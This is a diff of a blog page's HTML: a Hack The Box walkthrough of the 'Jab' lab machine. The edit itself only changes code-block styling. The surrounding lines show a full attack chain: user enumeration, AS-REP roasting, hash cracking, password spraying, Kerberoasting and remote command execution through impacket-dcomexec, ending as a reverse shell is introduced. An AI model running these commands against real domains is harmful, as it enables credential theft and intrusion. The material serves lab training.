@@ -248,7 +248,7 @@
 <ul>
 <li>
 <p><strong>Basic TCP Scan</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>nmap $box -Pn -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -306,7 +306,7 @@
 <ul>
 <li>
 <p><strong>In depth scan TCP</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -594,7 +594,7 @@
 </ul>
 <ol>
 <li><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#f92672">(</span>...ontent-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Jab/scans/nmap<span style="color:#f92672">)</span>───<span style="color:#f92672">(</span>kali@kali:pts/8<span style="color:#f92672">)</span>─┐
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#f92672">(</span>...ontent-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Jab/scans/nmap<span style="color:#f92672">)</span>───<span style="color:#f92672">(</span>kali@kali:pts/8<span style="color:#f92672">)</span>─┐
 </span></span><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>14:02:13 on main<span style="color:#f92672">)</span>──&gt; python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
@@ -610,7 +610,7 @@
 <ul>
 <li>
 <p>It turns out the anonymous bind is (+NOT+) enabled and we get the below information.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span> Connection Attempts
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span>  • Attempting SSL connection...
@@ -629,7 +629,7 @@
 </span></span></code></pre></div><ol>
 <li>
 <p><!-- raw HTML omitted -->We have the domain functionality level<!-- raw HTML omitted -->:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  • Forest Level: <span style="color:#ae81ff">7</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  • Forest Level: <span style="color:#ae81ff">7</span>
 </span></span><span style="display:flex;"><span>  • Domain Level: <span style="color:#ae81ff">7</span>
 </span></span></code></pre></div><ul>
 <li>The functionality level determines the minimum version of Windows server that can be used for a DC.
@@ -714,7 +714,7 @@
 </li>
 <li>
 <p><!-- raw HTML omitted -->We have the full server name &amp; domain name<!-- raw HTML omitted -->:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span> Server Information
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span>  • IP Address  : 10.129.230.215
@@ -737,7 +737,7 @@
 <p><strong>Updated Domain &amp; Machine Variables for Testing</strong>:</p>
 <ul>
 <li>Now that I have this information, I can update the <code>domain</code> and <code>machine</code> variables used in tests:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;jab.htb&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;jab.htb&#34;</span>
 </span></span><span style="display:flex;"><span>update_var machine <span style="color:#e6db74">&#34;DC01&#34;</span>
 </span></span></code></pre></div></li>
 </ul>
@@ -747,7 +747,7 @@
 <ul>
 <li>I update my <code>/etc/hosts</code> file to enable tools like <a href="https://github.com/ropnop/kerbrute"  target="_blank" rel="noreferrer nofollow">kerbrute</a>
  for user enumeration and other tools that require DNS or LDAP for queries:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts
 </span></span></code></pre></div></li>
 </ul>
 </li>
@@ -764,7 +764,7 @@
 <h3 id="dns-53">DNS <code>53</code>:</h3>
 <ul>
 <li><strong>Using dnsenum to enumerate DNS entries</strong>:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain
 </span></span></code></pre></div></li>
 </ul>
 <p>We get standard entries:</p>
@@ -777,7 +777,7 @@
 <h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute"  target="_blank" rel="noreferrer nofollow">Kerbrute</a>
  to bruteforce Usernames:</h4>
 <p>Kerbrute is great for bruteforcing usernames/emails when kerberos is running.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
 </span></span></code></pre></div><p>That&rsquo;s a lot of usernames…….however pretty realistic in a large environment so lets get these saved and use them later.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-142648_.png">
@@ -785,10 +785,10 @@
 </li>
 </ul>
 <p>Lets extract the emails for ease:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F: <span style="color:#e6db74">&#39;{ gsub(/^[ \t]+|[ \t]+$/, &#34;&#34;, $4); print $4 }&#39;</span> kerbruteUsers.txt &gt;&gt; KEmails.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F: <span style="color:#e6db74">&#39;{ gsub(/^[ \t]+|[ \t]+$/, &#34;&#34;, $4); print $4 }&#39;</span> kerbruteUsers.txt &gt;&gt; KEmails.txt
 </span></span></code></pre></div><p>This may look complex but all it does is extract the Emails using <code>awk</code> and any leading/trailing whitespace.</p>
 <p>Now we need to extract just the usernames:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F@ <span style="color:#e6db74">&#39;{ print $1 }&#39;</span> KEmails.txt &gt; KUsernames.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F@ <span style="color:#e6db74">&#39;{ print $1 }&#39;</span> KEmails.txt &gt; KUsernames.txt
 </span></span></code></pre></div><p>Now we have two files ready for use.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-144225_.png">
@@ -798,7 +798,7 @@
 <h2 id="2-dot-foothold">2. Foothold:</h2>
 <h3 id="finding-an-asrep-roastable-user-using-impacket-getnpusers">Finding an ASREP Roastable User using <code>impacket-GetNPUsers</code>:</h3>
 <p>We should always try and asreproast with a null/guest session as it can lead to an easy win</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># This one will just work, without having to pass anything else.</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># This one will just work, without having to pass anything else.</span>
 </span></span><span style="display:flex;"><span>impacket-GetNPUsers $domain/ -request
 </span></span></code></pre></div><p>As we can see it did not work.</p>
 <ul>
@@ -807,7 +807,7 @@
 </li>
 </ul>
 <p>Lets try with our extracted kerbrute usernames</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-GetNPUsers $domain/ -dc-ip $box -usersfile KUsers.txt -format hashcat -outputfile asRepHashes.txt -no-pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-GetNPUsers $domain/ -dc-ip $box -usersfile KUsers.txt -format hashcat -outputfile asRepHashes.txt -no-pass
 </span></span></code></pre></div><p>And looking at our output file we can see we have captured 3 asrep hashes:</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-145223_.png">
@@ -815,7 +815,7 @@
 </li>
 </ul>
 <p>Cracking ASREP tickets to recover clear-text passwords.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Cracking</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Cracking</span>
 </span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">18200</span> asRepHashes.txt ~/Wordlists/rockyou.txt
 </span></span></code></pre></div><p>We managed to crack the users &ldquo;jmontgomery&rdquo; ticket and recover their password &ldquo;Midnight_121&rdquo;</p>
 <ul>
@@ -824,7 +824,7 @@
 </li>
 </ul>
 <p>Lets validate the creds.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
 </span></span></code></pre></div><p>They are!</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-145806_.png">
@@ -833,7 +833,7 @@
 </ul>
 <h4 id="cred-stuffing-with-our-found-credential">Cred stuffing with our found credential:</h4>
 <p>As we have found a valid cred, we can try cred stuffing to see if any other users have the same password:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute passwordspray -d $domain --dc $box KUsernames.txt $pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute passwordspray -d $domain --dc $box KUsernames.txt $pass
 </span></span></code></pre></div><p>We only get our known user as a hit</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-201013_.png">
@@ -842,7 +842,7 @@
 </ul>
 <h4 id="using-netexec-for-kerberoasting">Using netexec for Kerberoasting:</h4>
 <p>As we have creds we can kerberoast:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec ldap $box -u $user -p $pass --kerberoast kerb.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec ldap $box -u $user -p $pass --kerberoast kerb.txt
 </span></span></code></pre></div><p>As we can see there is an error, lets try another tool.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-145921_.png">
@@ -850,7 +850,7 @@
 </li>
 </ul>
 <p>Using <code>impacket-getuserspns.py</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 /home/kali/linuxTools/impacket/examples/GetUserSPNs.py -outputfile kerb.txt -dc-ip $box $domain/$user:$pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 /home/kali/linuxTools/impacket/examples/GetUserSPNs.py -outputfile kerb.txt -dc-ip $box $domain/$user:$pass
 </span></span></code></pre></div><p>No hits.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-161017_.png">
@@ -860,26 +860,26 @@
 <h3 id="smb-445">SMB <code>445</code>:</h3>
 <h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
 <p>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span></code></pre></div><p>We can see that neither work, however we have creds for a user so we get use them to check.</p>
 <h4 id="trying-usernames-as-passwords">Trying Usernames as Passwords:</h4>
 <ul>
 <li>I always try usernames as passwords as well. We can again use our extracted kerbrute usernames file for this check.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
 </span></span></code></pre></div></li>
 </ul>
 <h4 id="enumerating-smb-shares-using-netexec">Enumerating SMB shares using netexec:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
 </span></span></code></pre></div><p>Lets spider them for ease and check the results</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass -M spider_plus
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass -M spider_plus
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-22-170747_.png">
 </figure>
 </li>
 </ul>
 <p>Lets see if there is anything of note.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /tmp/nxc_hosted/nxc_spider_plus/*.json
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /tmp/nxc_hosted/nxc_spider_plus/*.json
 </span></span></code></pre></div><p>Nothing of value</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-22-170904_.png">
@@ -888,7 +888,7 @@
 </ul>
 <h4 id="enumerating-users-with-impacket-lookupsid">Enumerating Users with Impacket-lookupsid:</h4>
 <p>We can use <code>impacket-lookupsid</code> to enumerate users &amp; groups on the domain, well anything that has a SID.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid $domain/$user@$machine.$domain -domain-sids
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid $domain/$user@$machine.$domain -domain-sids
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-22-171059_.png">
 </figure>
@@ -897,7 +897,7 @@
 <p>This has provided some really valuable information as we can see there are two service accounts listed however there is ALOT, so lets do a bloodhound collection to make this easier to process.</p>
 <h3 id="performing-a-bloodhound-collection">Performing a Bloodhound Collection:</h3>
 <p>I use bloodhound-python to perform a collection.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-22-172908_.png">
 </figure>
@@ -974,7 +974,7 @@
 <h4 id="xmpp-tools">XMPP tools:</h4>
 <p>As xmpp is in the results of our scans we need a tool to interact with the protocol, luckily there is a FOSS tool called <a href="https://www.pidgin.im/install/"  target="_blank" rel="noreferrer nofollow">pidgin</a>
  which we can use.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install pidgin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install pidgin
 </span></span></code></pre></div><h4 id="side-quest-what-s-xmpp">Side Quest: What&rsquo;s XMPP?</h4>
 <p>XMPP stands for <strong>Extensible Messaging and Presence Protocol</strong>. It&rsquo;s a communication protocol. Basically it&rsquo;s a set of rules computers use to send messages to each other.</p>
 <p>Think of XMPP like email but for chat: you can use different apps, run your own server if you want, and talk to people across the network.</p>
@@ -1060,7 +1060,7 @@
 </li>
 </ul>
 <h4 id="verifying-the-svc-openfire-credentials">Verifying the svc_openfire credentials:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares
 </span></span></code></pre></div><p>Valid, great we don&rsquo;t seem to have access to any further shares :(</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-23-082845_.png">
@@ -1081,7 +1081,7 @@
 </li>
 </ul>
 <p>Out of curiosity if we decode the base64 string it gives us the following output</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==&#39;</span> | base64 -d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==&#39;</span> | base64 -d
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-23-083103_.png">
 </figure>
@@ -1095,9 +1095,9 @@
 <li>+Note+: You may be asking &ldquo;but if you don&rsquo;t pass an argument as per the instructions it just opens a semi-interactive shell?&rdquo; well you&rsquo;re right but that did not work for me on this box, so lets keep it moving.</li>
 </ul>
 <p>Start our listener with tcpdump</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo tcpdump -i tun0 icmp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo tcpdump -i tun0 icmp
 </span></span></code></pre></div><p>Pass our command using <code>impacket-dcomexec</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box <span style="color:#e6db74">&#39;ping 10.10.14.31&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box <span style="color:#e6db74">&#39;ping 10.10.14.31&#39;</span>
 </span></span></code></pre></div><p>It works so we have remote code execution!</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-23-161931_.png">
@@ -1146,7 +1146,7 @@
 <h5 id="option-one-standard-base64-encoded-shell">Option One Standard base64 encoded shell:</h5>
 <p>I like to use <a href="https://www.revshells.com/"  target="_blank" rel="noreferrer nofollow">https://www.revshells.com/</a>
  and use the base64 encoded Powershell option.</p>
